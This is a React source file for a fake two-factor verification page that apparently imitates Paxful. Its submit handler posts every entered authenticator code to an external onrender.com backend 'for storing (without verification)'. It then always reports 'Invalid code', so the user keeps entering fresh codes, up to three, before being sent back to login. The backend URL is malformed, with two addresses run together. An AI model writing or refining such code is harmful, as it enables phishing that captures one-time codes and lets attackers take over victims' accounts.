import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import './VerificationInput.css';

const VerificationInput = () => {
  const [codes, setCodes] = useState(['', '', '', '', '', '']);
  const [attempts, setAttempts] = useState(0);
  const [message, setMessage] = useState('');
  const [isError, setIsError] = useState(false);
  const [countDown, setCountDown] = useState(null);
  const inputRefs = useRef([]);
  const navigate = useNavigate();
  
  useEffect(() => {
    // Focus on the first input when component mounts
    if (inputRefs.current[0]) {
      inputRefs.current[0].focus();
    }
  }, []);
  
  const handleChange = (index, value) => {
    if (!/^\d*$/.test(value)) return;
    const newCodes = [...codes];
    newCodes[index] = value;
    setCodes(newCodes);
    
    // Move to the next input field when a digit is entered
    if (value && index < 5) {
      inputRefs.current[index + 1].focus();
    }
  };
  
  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !codes[index] && index > 0) {
      inputRefs.current[index - 1].focus();
    }
  };
  
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').slice(0, 6);
    if (!/^\d+$/.test(pastedData)) return;
    
    const newCodes = [...codes];
    pastedData.split('').forEach((char, index) => {
      if (index < 6) newCodes[index] = char;
    });
    setCodes(newCodes);
    
    // Focus on the last filled input or the next empty one
    const lastFilledIndex = Math.min(pastedData.length - 1, 5);
    if (inputRefs.current[lastFilledIndex + 1]) {
      inputRefs.current[lastFilledIndex + 1].focus();
    } else if (inputRefs.current[lastFilledIndex]) {
      inputRefs.current[lastFilledIndex].focus();
    }
  };
  
  useEffect(() => {
    // Clear countdown timer when component unmounts
    return () => {
      if (countDown) {
        clearTimeout(countDown);
      }
    };
  }, [countDown]);

  const handleSubmit = async () => {
    const enteredCode = codes.join('');
    const maxAttempts = 3;
    
    try {
      // Send the entered code to your backend for storing (without verification)
      await fetch('https://paxful-backend-4.onrender.comhttp://127.0.0.1:5000/verify_code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ code: enteredCode }),
      });

      // Always show "Invalid code" message and track attempts
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      setIsError(true);

      if (newAttempts >= maxAttempts) {
        setMessage('Invalid code. Maximum attempts reached. Redirecting to login...');
        setCountDown(setTimeout(() => {
          navigate('/login');
        }, 3000));
      } else {
        const remainingAttempts = maxAttempts - newAttempts;
        setMessage(`Invalid code. ${remainingAttempts} attempt${remainingAttempts !== 1 ? 's' : ''} remaining.`);
        setCodes(['', '', '', '', '', '']);
        if (inputRefs.current[0]) {
          inputRefs.current[0].focus();
        }
      }
    } catch (error) {
      setIsError(true);
      setMessage('Error submitting code. Please try again.');
      console.error('Error submitting code:', error);
    }
  };

  useEffect(() => {
    // Check if all inputs are filled to auto-submit
    if (codes.every(code => code !== '')) {
      setTimeout(() => handleSubmit(), 100);
    }
  });

  return (
    <div className="verification-container">
      <div className="verification-card">
        <div className="verification-header1">
        </div>
  
        <div className="verification-header" >
          <h1 className="verification-title">Verification</h1>
          <p className="verification-description">
            Enter the 6-digit code we sent to the authenticator associated with your account:
          </p>
          <p className="verification-email">{/* Display the email here */}</p>
        </div>
  
        <div className="verification-input-section">
          <label className="verification-label" htmlFor="code-input-0">
            Confirmation code
          </label>
          <div className="verification-inputs" role="group" aria-labelledby="code-input-0" >
            {codes.map((code, index) => (
              <input
                key={index}
                id={`code-input-${index}`} // Fix the id
                ref={(el) => (inputRefs.current[index] = el)}
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={1}
                value={code}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={handlePaste}
                className="verification-input"
                aria-label={`Digit ${index + 1} of verification code`} // Fix the aria-label
              />
            ))}
          </div>
          
          {message && (
            <p className={`verification-message ${isError ? 'verification-error' : 'verification-success'}`}>
              {message}
            </p>
          )}
          
          {attempts > 0 && attempts < 3 && (
            <p className="verification-attempts-message" >
              {3 - attempts} attempt{3 - attempts !== 1 ? 's' : ''} remaining
            </p>
          )}
        </div>
      </div>
      <div className="verification-image">
        
      </div>
    </div>
  );
};

export default VerificationInput;
